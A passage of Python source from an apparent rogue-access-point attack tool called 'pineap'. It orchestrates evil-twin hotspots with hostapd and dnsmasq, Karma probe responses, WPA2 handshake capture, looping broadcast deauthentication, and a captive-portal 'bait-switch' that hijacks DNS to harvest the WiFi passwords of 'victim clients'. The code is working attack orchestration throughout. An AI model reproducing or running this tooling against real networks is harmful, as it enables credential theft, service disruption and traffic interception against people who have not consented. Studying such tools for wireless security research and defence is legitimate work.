        # ---- 3. Render + launch hostapd ----
        primary_bssid = hostapd_tool.bssid_for_ssid(primary_ssid, salt)
        # Build extras from pool: pinned first, exclude hidden, exclude
        # primary, cap at MAX_BSS - 1 (chip limit). Pool entries with
        # the same SSID as primary would just collide; skip them.
        extras: list[dict[str, Any]] = []
        # Cap at MAX_BSS - 1 because the primary BSS already counts as
        # one. Check BEFORE the append (not after) — checking after
        # would still allow 1 extra when MAX_BSS=1, because the
        # ``>= MAX_BSS - 1`` test is satisfied after the first append.
        # This bit us on the mt76x2u cap=1 path: hostapd was getting a
        # 2-BSS config even with DEFAULT_MAX_BSS=1.
        for e in sorted(pool, key=lambda x: (not x.get("pinned"),
                                             -(x.get("last_seen") or 0))):
            if len(extras) >= hostapd_tool.DEFAULT_MAX_BSS - 1:
                break
            ssid = e.get("ssid")
            if not ssid or e.get("hidden") or ssid == primary_ssid:
                continue
            if not self._ssid_allowed(ssid, snap):
                continue
            extras.append({
                "ssid":   ssid,
                "bssid":  hostapd_tool.bssid_for_ssid(ssid, salt),
                "hidden": False,
            })

        # Security mode determines whether we render an open AP or a
        # WPA2-PSK AP. For wpa2, generate a fresh random PSK every
        # Start — the value doesn't matter functionally (clients fail
        # at M3 with our random PSK, but by then we've collected M2's
        # MIC which is the partial we want), and randomizing it
        # guarantees we never accidentally accept a real client
        # connection. Persisted to state so the operator can see what
        # was generated; surfaced in the notification drawer too.
        security_mode = snap.get("security_mode", "open")
        rogue_psk: str | None = None
        if security_mode == "wpa2":
            # 16 url-safe bytes → ~22 ASCII chars (alphanumeric + - _).
            # All valid WPA passphrase chars (spec: 8-63 ASCII).
            rogue_psk = secrets.token_urlsafe(16)
            with self._lock:
                self._state["last_rogue_psk"] = rogue_psk
                self._save_state()

        mac_acl_kwargs = self._write_mac_acl(snap)
        if mac_acl_kwargs:
            msgs.append(f"client MAC filter: {snap.get('client_filter_mode')} "
                        f"({len(snap.get('client_filter_macs') or [])} MACs)")
        hostapd_body = hostapd_tool.render_config(
            iface=iface,
            ssid=primary_ssid,
            password=rogue_psk,             # None → open AP; str → wpa=2
            channel=channel,
            hw_mode=hw_mode,
            primary_bssid=primary_bssid,
            hidden=bool(snap.get("primary_hidden")),
            extra_bsses=extras,
            **mac_acl_kwargs,
        )
        hostapd_tool.write_config(HOSTAPD_CONFIG_PATH, hostapd_body)
        hostapd_cmd = ["hostapd", str(HOSTAPD_CONFIG_PATH)]
        try:
            hap_job = job_manager.start_job(
                hostapd_cmd, name="pineap-hostapd", tags=["pineap"],
            )
            with self._lock:
                self._state["hostapd_job_id"] = hap_job.id
            sec_label = "WPA2-PSK" if security_mode == "wpa2" else "open"
            psk_label = f" (rogue PSK: {rogue_psk})" if rogue_psk else ""
            msgs.append(
                f"hostapd started [{sec_label}]: SSID {primary_ssid!r} + "
                f"{len(extras)} extras on ch{channel} (job {hap_job.id})"
                f"{psk_label}"
            )
        except Exception as e:
            log.exception("pineap: hostapd launch failed")
            return False, msgs + [f"hostapd launch failed: {e}"]

        # ---- 4. Captive sentinel listener ----
        try:
            from app.services.captive_sentinel import get_service as get_sentinel
            sentinel = get_sentinel()
            ok, msg = sentinel.start(
                bind_host=gateway, bind_port=80, stub=stub_mode(),
            )
            with self._lock:
                self._state["sentinel_running"] = ok
            msgs.append(f"captive sentinel: {msg}")
        except Exception as e:
            log.exception("pineap: sentinel start failed")
            msgs.append(f"sentinel start failed: {e}")
            # Sentinel is enrichment-only — not fatal

        # ---- 5. client_recon log tailer + lease-file poller ----
        # The lease poller is the *primary* source of truth for
        # connected clients; the tailer is enrichment (OS fingerprint
        # via DHCP option 55, DNS query history). Running both means
        # clients show up even if log parsing falters on a format
        # we haven't accounted for.
        try:
            from app.services.client_recon import get_service as get_recon
            client_recon = get_recon()
            ok, msg = client_recon.start_tailer(DNSMASQ_LOG_PATH)
            msgs.append(f"client-recon tailer: {msg}")
            ok, msg = client_recon.start_lease_poller(DNSMASQ_LEASES_PATH)
            msgs.append(f"client-recon lease poller: {msg}")
        except Exception as e:
            log.exception("pineap: client_recon start failed")
            msgs.append(f"client-recon start failed: {e}")

        # ---- 6. Auto-add subnet to deny-list ----
        try:
            ok, msg = access_control.add_cidr(subnet)
            msgs.append(f"deny-list +{subnet}: {msg}")
        except Exception as e:
            log.exception("pineap: deny-list add failed")
            msgs.append(f"deny-list add failed: {e} — add {subnet} manually!")

        # ---- 6.5. NAT + IP forwarding so the rogue subnet gets internet ----
        # Without this, victim clients associate + DHCP + get DNS, but every
        # outbound TCP/UDP packet dies at the Pi's gateway because there's no
        # route translation. Captive-portal probes return "No Internet" and
        # the OS keeps cellular as the primary route (which limits how much
        # the rogue actually sees). The same pattern S04.9 used for the mgmt
        # AP — different subnet, same wrapper.
        try:
            from app.tools import iptables
            ok, msg = iptables.enable_ip_forward()
            msgs.append(f"ip_forward: {msg}")
            ok, msg = iptables.ensure_nat_masquerade(subnet)
            msgs.append(f"nat MASQUERADE +{subnet}: {msg}")
            ok, msg = iptables.ensure_forward_rules(subnet)
            msgs.append(f"FORWARD +{subnet}: {msg}")
        except Exception as e:
            log.exception("pineap: NAT setup failed")
            msgs.append(f"NAT setup failed: {e} — phone may show 'No Internet'")

        # ---- 7. Karma OR Evil WPA sniffer (mutually exclusive — both
        #         want wlan-mon-5g). Decision rules:
        #
        #   security_mode=open + mode=advanced  → Karma (probe-response
        #                                          injector for pool SSIDs)
        #   security_mode=wpa2 + mode in (active, advanced) → Evil WPA
        #                                          EAPOL sniffer
        #   anything else → neither
        #
        # Karma + Evil WPA can't run simultaneously on this hardware
        # because both pin wlan-mon-5g to hostapd's channel. If the
        # operator wants both behaviours they'd need a fourth radio,
        # out of scope.
        mon_iface = snap.get("karma_iface", DEFAULT_KARMA_IFACE)
        want_karma = (advanced and security_mode == "open")
        want_evil_wpa = (security_mode == "wpa2")

        if want_karma or want_evil_wpa:
            # Pause recon to free the monitor radio (same operational
            # cost for either sub-service). Remember whether it was
            # actually running first, so teardown only restores it if so.
            try:
                from app.services.recon import get_service as get_recon_svc
                rs = get_recon_svc()
                was_running = False
                if hasattr(rs, "get_status"):
                    was_running = (rs.get_status() or {}).get("state") == "running"
                with self._lock:
                    self._state["recon_was_running"] = was_running
                    self._save_state()
                if was_running and hasattr(rs, "stop_scan"):
                    rs.stop_scan()
                    msgs.append(f"recon paused ({mon_iface} claimed)")
                else:
                    msgs.append(f"recon was idle — {mon_iface} already free")
            except Exception:
                log.exception("pineap: recon-pause failed")
                msgs.append("recon-pause failed (continuing)")

        if want_karma:
            try:
                from app.services.karma import get_service as get_karma
                karma = get_karma()
                ok, msg = karma.start(
                    iface=mon_iface,
                    channel=channel,
                    primary_bssid=primary_bssid,
                )
                with self._lock:
                    self._state["karma_running"] = ok
                msgs.append(f"karma: {msg}")
            except Exception as e:
                log.exception("pineap: karma start failed")
                msgs.append(f"karma start failed: {e}")

        if want_evil_wpa:
            # Optional evil-twin deauth coupling: only when the operator
            # opted in AND we have a real target BSSID (i.e. cloned from
            # Recon — a from-scratch WPA SSID has no AP to deauth). The
            # deauth fires on the spare radio (wlan-mon-2g), freed because
            # recon was paused above. MFP-required targets reject the
            # frames — we still attempt (warned in the UI), so it's a
            # no-op rather than an error there.
            target = snap.get("evil_wpa_target") or {}
            real_bssid = target.get("source_bssid")
            deauth_on = bool(snap.get("evil_wpa_deauth")) and bool(real_bssid)
            deauth_iface = snap.get("deauth_iface", DEFAULT_DEAUTH_IFACE)
            if snap.get("evil_wpa_deauth") and not real_bssid:
                msgs.append("evil_wpa deauth requested but no real target "
                            "BSSID (clone from Recon first) — skipping deauth")
            try:
                from app.services.evil_wpa import get_service as get_evil_wpa
                ew = get_evil_wpa()
                ok, msg = ew.start(
                    iface=mon_iface,
                    channel=channel,
                    ap_bssid=primary_bssid,
                    ssid=primary_ssid,
                    deauth_enabled=deauth_on,
                    deauth_iface=deauth_iface if deauth_on else None,
                    deauth_bssid=real_bssid if deauth_on else None,
                    auto_captive_portal=bool(snap.get("auto_captive_portal")),
                )
                with self._lock:
                    self._state["evil_wpa_running"] = ok
                msgs.append(f"evil_wpa: {msg}")
                if deauth_on:
                    mfp = target.get("source_mfp_required")
                    mfp_note = (" (target advertises MFP-required — deauth "
                                "frames will be rejected)") if mfp else ""
                    msgs.append(f"evil-twin deauth armed at {real_bssid} "
                                f"on {deauth_iface}{mfp_note}")
            except Exception as e:
                log.exception("pineap: evil_wpa start failed")
                msgs.append(f"evil_wpa start failed: {e}")

        # ---- 8. Impersonation SSID rotation (S13) ----
        # Cycle the single BSS through the (filtered) pool. mt76x2u can't
        # beacon a whole pool at once (cap=1), so we rotate via config
        # rewrite + hostapd_cli reload every dwell. Open-only lure.
        if snap.get("impersonate_enabled"):
            try:
                self._start_impersonation()
                with self._lock:
                    self._state["impersonate_running"] = True
                    self._save_state()
                msgs.append(
                    f"impersonation rotation started (dwell "
                    f"{snap.get('impersonate_dwell_secs')}s, "
                    f"{snap.get('impersonate_bssid_strategy')} BSSIDs)")
            except Exception as e:
                log.exception("pineap: impersonation start failed")
                msgs.append(f"impersonation start failed: {e}")

        return True, msgs

    def _tear_down_broadcast(self) -> list[str]:
        """Reverse of _start_broadcast. Best-effort — each step
        independently logs but doesn't abort the others if it fails."""
        from app.services.access_control import access_control
        from app.services.job_manager import job_manager
        from app.tools import iproute

        msgs: list[str] = []
        with self._lock:
            self._load()
            snap = dict(self._state)

        # 0a. Impersonation rotation (S13) — stop the thread before we
        #     tear hostapd down under it.
        if snap.get("impersonate_running"):
            try:
                self._stop_impersonation()
                msgs.append("impersonation rotation stopped")
            except Exception as e:
                msgs.append(f"impersonation stop failed: {e}")

        # 0. Captive portal (S12.5) — take the sentinel out of portal
        #    mode and disarm the verifier so a stale handshake never
        #    outlives the session. The sentinel itself is stopped below.
        if snap.get("captive_portal_active"):
            try:
                from app.services.captive_sentinel import get_service as get_sentinel
                get_sentinel().set_portal_mode(False)
                from app.services.captive_portal import get_service as get_cp
                get_cp().disarm()
                msgs.append("captive portal disarmed + sentinel un-lied")
            except Exception as e:
                msgs.append(f"captive portal teardown failed: {e}")

        # 0b. Direct open-portal standalone deauth loop (if running).
        if snap.get("direct_deauth_running"):
            try:
                self._stop_direct_deauth()
                msgs.append("direct deauth loop stopped")
            except Exception as e:
                msgs.append(f"direct deauth stop failed: {e}")

        # 1. Karma OR Evil WPA (mutually exclusive — both pin wlan-mon-5g).
        #    Evil WPA's stop() also tears down the coupled deauth thread
        #    on the spare radio.
        if snap.get("karma_running"):
            try:
                from app.services.karma import get_service as get_karma
                ok, msg = get_karma().stop()
                msgs.append(f"karma stop: {msg}")
            except Exception as e:
                msgs.append(f"karma stop failed: {e}")
        if snap.get("evil_wpa_running"):
            try:
                from app.services.evil_wpa import get_service as get_evil_wpa
                ok, msg = get_evil_wpa().stop()
                msgs.append(f"evil_wpa stop: {msg}")
            except Exception as e:
                msgs.append(f"evil_wpa stop failed: {e}")
        # Restore recon ONLY if it was running before we paused it. If the
        # operator had recon stopped before starting the rogue AP, leave it
        # stopped — restarting it on teardown would be a surprise scan they
        # never asked for.
        if (snap.get("karma_running") or snap.get("evil_wpa_running")) \
                and snap.get("recon_was_running"):
            try:
                from app.services.recon import get_service as get_recon_svc
                rs = get_recon_svc()
                if hasattr(rs, "start_scan"):
                    rs.start_scan()
                msgs.append("recon restored (was running before)")
            except Exception:
                log.exception("pineap: recon-restore failed")
                msgs.append("recon-restore failed (manual restart may be needed)")
        elif snap.get("karma_running") or snap.get("evil_wpa_running"):
            msgs.append("recon left stopped (was not running before)")

        # 2. Captive sentinel + client_recon tailer
        try:
            from app.services.captive_sentinel import get_service as get_sentinel
            ok, msg = get_sentinel().stop()
            msgs.append(f"sentinel stop: {msg}")
        except Exception as e:
            msgs.append(f"sentinel stop failed: {e}")
        try:
            from app.services.client_recon import get_service as get_client_recon
            cr = get_client_recon()
            cr.stop_tailer()
            cr.stop_lease_poller()
            msgs.append("client-recon tailer + lease poller stopped")
        except Exception as e:
            msgs.append(f"client-recon stop failed: {e}")

        # 3. hostapd + dnsmasq via JobManager
        for key, label in (("hostapd_job_id", "hostapd"),
                           ("dnsmasq_job_id", "dnsmasq")):
            jid = snap.get(key)
            if jid:
                try:
                    ok, reason = job_manager.stop_job(jid, grace=3.0,
                                                     first_signal=signal.SIGTERM)
                    msgs.append(f"{label} stop ({jid[:8]}): {reason}")
                except Exception as e:
                    msgs.append(f"{label} stop failed: {e}")

        # 4. Remove subnet from deny-list + tear down NAT/FORWARD rules
        try:
            ok, msg = access_control.remove_cidr(snap.get("subnet", DEFAULT_SUBNET))
            msgs.append(f"deny-list -{snap.get('subnet')}: {msg}")
        except Exception as e:
            msgs.append(f"deny-list remove failed: {e}")
        try:
            from app.tools import iptables
            ok, msg = iptables.remove_nat_and_forward(
                snap.get("subnet", DEFAULT_SUBNET))
            msgs.append(f"NAT teardown: {msg}")
        except Exception as e:
            msgs.append(f"NAT teardown failed: {e}")

        # 5. Tear down the AP interface
        iface = snap.get("iface", DEFAULT_IFACE)
        try:
            iproute.set_link_state(iface, "down")
            iproute.flush_address(iface)
            msgs.append(f"{iface} brought down + flushed")
        except Exception as e:
            msgs.append(f"{iface} teardown failed: {e}")

        return msgs

    # ---------- Captive-portal bait-switch (S12.5) ----------
    def launch_captive_portal(self, hash_line: str, ssid: str
                              ) -> tuple[bool, list[str]]:
        """Bait-switch: after Evil WPA harvests a partial, flip the rogue
        from WPA2 to an **Open** clone of the same SSID and arm the
        captive portal against the captured handshake. Called by
        ``evil_wpa`` on the first partial when the per-start
        ``auto_captive_portal`` option was set.

        Gated on the global captive-portal opt-in (Settings → Security).
        Idempotent-ish: re-arming with a fresh handshake is harmless.
        """
        msgs: list[str] = []
        from app.services.captive_portal import get_service as get_cp
        cp = get_cp()
        self._register_teardown_app(cp)
        if not cp.is_enabled():
            return False, ["captive portal disabled (Settings → Security) "
                           "— bait-switch skipped"]
        with self._lock:
            self._load()
            if not self._state.get("running"):
                return False, ["pineap not running — bait-switch skipped"]
            snap = dict(self._state)

        # 1. Arm the verifier against the captured handshake.
        ok, msg = cp.arm(hash_line, ssid)
        msgs.append(f"portal arm: {msg}")
        if not ok:
            return False, msgs

        # 2. Flip hostapd WPA2 → Open (same SSID/BSSID/channel).
        ok, sub = self._rerender_hostapd_open(snap)
        msgs.extend(sub)
        if not ok:
            cp.disarm()
            return False, msgs

        # 2b. DNS hijack: dnsmasq is normally already hijacked because
        #     auto_captive_portal armed this run (see _start_broadcast), so
        #     no fragile mid-flight restart is needed. Only restart if it
        #     somehow isn't (e.g. the opt-in was toggled on after start).
        if not snap.get("dnsmasq_hijacked"):
            ok_d, dmsgs = self._restart_dnsmasq(snap, hijack=True)
            msgs.extend(dmsgs)
        else:
            msgs.append("dns-hijack: already active (started hijacked)")

        # 3. Put the captive sentinel into portal/lie mode, handing it the
        #    portal service instance (the handler runs without app context).
        try:
            from app.services.captive_sentinel import get_service as get_sentinel
            get_sentinel().set_portal_mode(True, portal=cp)
            msgs.append("captive sentinel → portal mode")
        except Exception as e:
            msgs.append(f"sentinel portal-mode failed: {e}")

        with self._lock:
            self._state["captive_portal_active"] = True
            self._state["last_changed"] = time.time()
            self._save_state()
        log.info("pineap: captive-portal bait-switch live for %r", ssid)
        return True, msgs

    def _rerender_hostapd_open(self, snap: dict[str, Any]
                               ) -> tuple[bool, list[str]]:
        """Re-render hostapd as an OPEN AP (same iface/SSID/BSSID/channel)
        and restart the job, replacing the WPA2 instance. The same-SSID
        open clone is what lets the victim rejoin password-free so the
        captive portal can fire."""
        import signal as _signal

        from app.tools import hostapd as hostapd_tool
        from app.services.job_manager import job_manager
        from app.tools._common import stub_mode

        msgs: list[str] = []
        iface   = snap["iface"]
        ssid    = snap["primary_ssid"]
        channel = int(snap["channel"])
        hw_mode = snap["hw_mode"]
        salt    = snap["bssid_salt"]
        bssid   = hostapd_tool.bssid_for_ssid(ssid, salt)

        body = hostapd_tool.render_config(
            iface=iface, ssid=ssid, password=None,   # None → open AP
            channel=channel, hw_mode=hw_mode,
            primary_bssid=bssid, hidden=False, extra_bsses=[],
        )
        hostapd_tool.write_config(HOSTAPD_CONFIG_PATH, body)

        # Stop the WPA hostapd job, start the open one.
        old = snap.get("hostapd_job_id")
        if old and not stub_mode():
            try:
                job_manager.stop_job(old, grace=3.0,
                                     first_signal=_signal.SIGTERM)
            except Exception as e:
                msgs.append(f"stop old hostapd failed: {e}")
        try:
            job = job_manager.start_job(
                ["hostapd", str(HOSTAPD_CONFIG_PATH)],
                name="pineap-hostapd-open", tags=["pineap"],
            )
            with self._lock:
                self._state["hostapd_job_id"] = job.id
                self._save_state()
            msgs.append(f"hostapd flipped to OPEN clone of {ssid!r} "
                        f"on ch{channel} (job {job.id})")
        except Exception as e:
            log.exception("pineap: open-hostapd flip failed")
            return False, msgs + [f"open hostapd launch failed: {e}"]
        return True, msgs

    # ---------- dnsmasq config (shared by start + captive hijack) ----------
    def _render_dnsmasq_body(self, snap: dict[str, Any], *,
                             hijack: bool = False) -> str:
        """Build the rogue dnsmasq.conf. ``hijack=True`` resolves every
        name to the gateway (captive-portal mode) instead of forwarding
        upstream. Appends our log-facility / leasefile / pid-file."""
        from app.tools import dnsmasq as dnsmasq_tool
        gateway = snap["gateway_ip"]
        dhcp_start, dhcp_end = snap["dhcp_range"]
        body = dnsmasq_tool.render_config(
            iface=snap["iface"],
            gateway_ip=gateway,
            dhcp_range_start=dhcp_start,
            dhcp_range_end=dhcp_end,
            dhcp_lease="12h",
            forward_dns=not hijack,
            log_queries=True,
            coexist_with_other_dnsmasq=True,
            dns_hijack_ip=gateway if hijack else None,
        )
        body += (
            f"log-facility={DNSMASQ_LOG_PATH}\n"
            f"dhcp-leasefile={DNSMASQ_LEASES_PATH}\n"
            f"pid-file={DNSMASQ_PID_PATH}\n"
        )
        return body

    def _restart_dnsmasq(self, snap: dict[str, Any], *, hijack: bool
                         ) -> tuple[bool, list[str]]:
        """Re-render + relaunch the rogue dnsmasq (e.g. to switch on the
        captive-portal DNS hijack). Replaces the running dnsmasq job."""
        import signal as _signal
        from app.tools import dnsmasq as dnsmasq_tool
        from app.services.job_manager import job_manager
        from app.tools._common import stub_mode

        dnsmasq_tool.write_config(DNSMASQ_CONFIG_PATH,
                                  self._render_dnsmasq_body(snap, hijack=hijack))
        with self._lock:
            old = self._state.get("dnsmasq_job_id")
        if old and not stub_mode():
            try:
                job_manager.stop_job(old, grace=3.0,
                                     first_signal=_signal.SIGTERM)
            except Exception as e:
                log.warning("pineap: stop old dnsmasq failed: %s", e)
        cmd = ["dnsmasq", "--keep-in-foreground", "-C", str(DNSMASQ_CONFIG_PATH)]
        try:
            job = job_manager.start_job(cmd, name="pineap-dnsmasq", tags=["pineap"])
            with self._lock:
                self._state["dnsmasq_job_id"] = job.id
                self._state["dnsmasq_hijacked"] = hijack
                self._save_state()
            return True, [f"dnsmasq re-rendered (hijack={hijack}, job {job.id})"]
        except Exception as e:
            log.exception("pineap: dnsmasq restart failed")
            return False, [f"dnsmasq restart failed: {e}"]

    # ---------- Teardown-app registration (post-capture twin teardown) ----------
    def _register_teardown_app(self, cp: Any) -> None:
        """Hand the captive-portal service the Flask app object so its
        post-capture teardown timer can push a context. Best-effort."""
        try:
            from flask import current_app
            cp.set_runtime_app(current_app._get_current_object())
        except Exception:
            pass

    # ---------- Direct captive portal (S12.5) ----------
    def launch_captive_portal_direct(
        self, ssid: str | None = None, *,
        deauth: bool = True,
        handshake_id: str | None = None,
    ) -> tuple[bool, list[str]]:
        """Stand up an OPEN evil-twin + captive portal directly.

        Verification of submitted PSKs needs a captured 4-way handshake.
        Three paths, decided by the verify mode + what's supplied:

        * **mode A** — no handshake needed (always shows "success"); open
          the portal immediately.
        * **B/C with a chosen ``handshake_id``** — arm against that
          previously captured handshake, then open the portal; submitted
          PSKs are verified against it.
        * **B/C with no handshake** — we can't verify from an *open* twin
          (open networks have no EAPOL). So fall back to the WPA2
          capture-first flow: stand up the WPA2 twin against the real AP
          (looked up in Recon by SSID), capture a handshake, and the
          bait-switch flips to the open portal automatically on the first
          partial. Requires the SSID to be visible in Recon.

        ``deauth`` (default True) fires broadcast deauth at the matching
        real AP (looked up in Recon) on the spare radio to push clients
        onto our clone — warned-not-blocked on MFP-required targets.

        Gated on the global captive-portal opt-in (Settings → Security).
        """
        from app.services.captive_portal import get_service as get_cp
        cp = get_cp()
        self._register_teardown_app(cp)
        if not cp.is_enabled():
            return False, ["captive portal disabled (Settings → Security)"]

        mode = cp.get_config().get("verify_mode", "A")
        with self._lock:
            self._load()
            target_ssid = (ssid or "").strip() or self._state.get("primary_ssid")

        # Resolve a hash line if the operator picked a previously captured
        # handshake (used to arm verification on the open-twin path).
        hash_line: str | None = None
        if handshake_id:
            hash_line, hs_ssid, hs_msg = self._resolve_handshake_line(handshake_id)
            if not hash_line:
                return False, [f"handshake {handshake_id[:8]}…: {hs_msg}"]
            if hs_ssid:
                target_ssid = hs_ssid  # arm + clone the SSID we have a HS for

        # B/C with no handshake → must capture one first (open twins can't
        # produce a handshake). Delegate to the proven WPA2 capture flow.
        if mode in ("B", "C") and not hash_line:
            return self._capture_then_open(target_ssid, deauth=deauth)

        # ---- Open-twin path (mode A, or B/C with a chosen handshake) ----
        msgs: list[str] = []
        with self._lock:
            running = self._state.get("running")

        if not running:
            ok, m = self.set_ap_config(primary_ssid=target_ssid,
                                       security_mode="open")
            msgs.append(f"ap-config: {m}")
            self.set_mode("active")
            # Start dnsmasq already hijacked — no fragile restart, DHCP
            # stays intact (the bug that left clients on 169.254.x.x).
            self._pending_dns_hijack = True
            try:
                ok, sub = self.start()
            finally:
                self._pending_dns_hijack = False
            msgs.extend(sub)
            if not ok:
                return False, msgs
        else:
            with self._lock:
                snap = dict(self._state)
            ok, sub = self._rerender_hostapd_open(snap)
            msgs.extend(sub)
            if not ok:
                return False, msgs
            ok_d, dmsgs = self._restart_dnsmasq(snap, hijack=True)
            msgs.extend(dmsgs)

        with self._lock:
            self._load()
            snap = dict(self._state)

        # Arm the portal — with the chosen handshake if we have one, else
        # None (mode A: submitted creds recorded but not verified).
        cp.arm(hash_line, target_ssid)
        if hash_line:
            msgs.append(f"portal armed for {target_ssid!r} against chosen "
                        "handshake (submitted PSKs verified)")
        else:
            msgs.append(f"portal armed for {target_ssid!r} (no handshake — "
                        "submitted creds recorded, not verified)")
        try:
            from app.services.captive_sentinel import get_service as get_sentinel
            get_sentinel().set_portal_mode(True, portal=cp)
            msgs.append("captive sentinel → portal mode")
        except Exception as e:
            msgs.append(f"sentinel portal-mode failed: {e}")

        # Optional broadcast deauth at the real AP to pull clients over.
        if deauth:
            msgs.extend(self._start_direct_deauth(target_ssid))

        with self._lock:
            self._state["captive_portal_active"] = True
            self._save_state()
        log.info("pineap: direct captive portal live for %r", target_ssid)
        return True, msgs

    def _capture_then_open(self, target_ssid: str | None, *, deauth: bool
                           ) -> tuple[bool, list[str]]:
        """B/C verification with no chosen handshake: stand up the WPA2
        evil twin against the real AP (found in Recon by SSID) with the
        bait-switch armed, so it captures a handshake and auto-flips to the
        open portal. Verification then works against the captured HS."""
        msgs: list[str] = []
        with self._lock:
            if self._state.get("running"):
                return False, ["stop PineAP first — capture-first needs to "
                               "(re)start the WPA2 twin"]
        ap = self._find_recon_ap(target_ssid)
        if not ap:
            return False, [
                f"verify mode needs a handshake, but no Recon AP matches "
                f"{target_ssid!r}. Run Recon (or clone the target on the "
                "Evil WPA tab), or pick an existing handshake."]
        ok, m = self.clone_evil_wpa_target(
            ap["bssid"], ap["essid"], ap["channel"],
            source_security=ap.get("security"),
            source_mfp_required=ap.get("mfp_required"),
        )
        msgs.append(f"clone: {m}")
        if not ok:
            return False, msgs
        # Arm the bait-switch + (optional) deauth for this run, then start
        # the WPA2 twin. evil_wpa fires launch_captive_portal on the first
        # partial, which arms the portal against the real captured HS.
        with self._lock:
            self._state["auto_captive_portal"] = True
            self._state["evil_wpa_deauth"] = bool(deauth)
            self._save_state()
        self.set_mode("active")
        ok, sub = self.start()
        msgs.extend(sub)
        if not ok:
            return False, msgs
        msgs.append(f"capturing handshake for {ap['essid']!r} — the open "
                    "portal opens automatically on the first capture")
        return True, msgs

    # ---------- Recon lookup + handshake resolution helpers ----------
    def _find_recon_ap(self, essid: str | None) -> dict[str, Any] | None:
        """Strongest Recon AP whose ESSID matches ``essid``. Returns a
        dict with bssid/essid/channel/security/mfp_required, or None."""
        if not essid:
            return None
        try:
            from app.services.recon import get_service as get_recon
            return get_recon().find_ap_by_essid(essid)
        except Exception:
            log.exception("pineap: recon AP lookup failed")
            return None

    def _resolve_handshake_line(self, capture_id: str
                                ) -> tuple[str | None, str | None, str]:
        """Resolve a captured handshake to its single ``.22000`` line +
        ESSID, building the file on demand. Returns ``(line, essid, msg)``."""
        try:
            from app.services.handshakes import get_service as get_hs
            return get_hs().get_hash_line(capture_id)
        except Exception as e:
            log.exception("pineap: handshake resolve failed")
            return None, None, f"resolve failed: {e}"

    # ---------- Standalone broadcast deauth (direct open-portal path) ----------
    def _start_direct_deauth(self, ssid: str | None) -> list[str]:
        """Spawn a broadcast-deauth loop at the real AP matching ``ssid``
        (found in Recon) on the spare radio, to push its clients onto our
        open clone. No-op (warned) on MFP-required targets or when the AP
        isn't in Recon."""
        ap = self._find_recon_ap(ssid)
        if not ap:
            return [f"deauth requested but no Recon AP matches {ssid!r} — "
                    "skipping deauth (run Recon to enable it)"]
        bssid = ap["bssid"]
        channel = int(ap["channel"])
        with self._lock:
            iface = self._state.get("deauth_iface", DEFAULT_DEAUTH_IFACE)
        self._stop_direct_deauth()
        self._direct_deauth_stop.clear()

        try:
            from flask import current_app
            app = current_app._get_current_object()
        except Exception:
            app = None

        def _run() -> None:
            ctx = app.app_context() if app is not None else None
            if ctx:
                ctx.push()
            try:
                self._direct_deauth_loop(iface, bssid, channel)
            except Exception:
                log.exception("pineap: direct deauth loop crashed")
            finally:
                if ctx:
                    ctx.pop()

        t = threading.Thread(target=_run, name="pineap-direct-deauth",
                             daemon=True)
        self._direct_deauth_thread = t
        t.start()
        with self._lock:
            self._state["direct_deauth_running"] = True
            self._save_state()
        mfp = " (target advertises MFP-required — frames will be rejected)" \
            if ap.get("mfp_required") else ""
        return [f"broadcast deauth armed at {bssid} (ch{channel}) on "
                f"{iface}{mfp}"]

    def _direct_deauth_loop(self, iface: str, bssid: str, channel: int) -> None:
        """Prep the spare radio once (monitor + channel) then fire
        broadcast deauth bursts until stopped."""
        from app.tools import aireplay, iw
        from app.tools._common import stub_mode
        from app.services.adapters import get_service as get_adapter_service

        if not stub_mode():
            try:
                get_adapter_service().set_mode(iface, "monitor")
                iw.set_channel(iface, channel)
            except Exception:
                log.exception("pineap: direct deauth iface prep failed")
        log.info("pineap: direct deauth loop firing at %s ch%d on %s",
                 bssid, channel, iface)
        # Brief settle so the radio is on-channel before the first burst.
        self._direct_deauth_stop.wait(2.0)
        while not self._direct_deauth_stop.is_set():
            if not stub_mode():
                try:
                    aireplay.send_deauth(iface, bssid, client_mac=None, count=8)
                except Exception:
                    log.exception("pineap: direct deauth burst failed")
            self._direct_deauth_stop.wait(5.0)
        log.info("pineap: direct deauth loop stopped")

    def _stop_direct_deauth(self) -> None:
        """Signal the direct-deauth loop to stop (if running)."""
        self._direct_deauth_stop.set()
        t = self._direct_deauth_thread
        if t and t.is_alive():
            t.join(timeout=2.0)
        self._direct_deauth_thread = None
        try:
            with self._lock:
                if self._state is not None:
                    self._state["direct_deauth_running"] = False
                    self._save_state()
        except Exception:
            pass

    # ---------- Impersonation SSID rotation (S13) ----------
    def _start_impersonation(self) -> None:
        self._impersonation_stop.clear()
        try:
            from flask import current_app
            app = current_app._get_current_object()
        except Exception:
            app = None

        def _run() -> None:
            ctx = app.app_context() if app is not None else None
            if ctx:
                ctx.push()
            try:
                self._impersonation_loop()
            except Exception:
                log.exception("pineap: impersonation loop crashed")
            finally:
                if ctx:
                    ctx.pop()

        t = threading.Thread(target=_run, name="pineap-impersonate", daemon=True)
        self._impersonation_thread = t
        t.start()

    def _stop_impersonation(self) -> None:
        self._impersonation_stop.set()
        t = self._impersonation_thread
        if t is not None and t.is_alive():
            t.join(timeout=3.0)
        self._impersonation_thread = None

    def _rotation_bssid(self, ssid: str, snap: dict[str, Any]) -> str:
        import secrets as _secrets
        from app.tools import hostapd as hostapd_tool
        strategy = snap.get("impersonate_bssid_strategy", "per-ssid")
        salt = snap["bssid_salt"]
        if strategy == "shared":
            return hostapd_tool.bssid_for_ssid(snap.get("primary_ssid") or "pineap", salt)
        if strategy == "random":
            b0 = (_secrets.randbits(8) | 0x02) & 0xFE
            rest = [_secrets.randbits(8) for _ in range(5)]
            return ":".join(f"{b:02x}" for b in (b0, *rest))
        return hostapd_tool.bssid_for_ssid(ssid, salt)   # per-ssid (default)

    def _impersonation_loop(self) -> None:
        """Rotate the broadcast SSID through the filtered pool every
        dwell. Rewrites hostapd.conf + hostapd_cli reload (light); falls
        back to a full hostapd job restart if reload isn't honoured."""
        from app.tools import hostapd as hostapd_tool, hostapd_cli
        from app.tools._common import stub_mode

        while not self._impersonation_stop.is_set():
            with self._lock:
                self._load()
                snap = dict(self._state)
                pool = list(self._pool or [])
            iface   = snap["iface"]
            channel = int(snap["channel"])
            hw_mode = snap["hw_mode"]
            dwell   = float(snap.get("impersonate_dwell_secs", 20))

            # Rotation set: pinned-first, non-hidden, SSID-filter-allowed,
            # de-duplicated. Fall back to the primary SSID if empty.
            ssids: list[str] = []
            for e in sorted(pool, key=lambda x: (not x.get("pinned"),
                                                 -(x.get("last_seen") or 0))):
                s = e.get("ssid")
                if (s and not e.get("hidden") and self._ssid_allowed(s, snap)
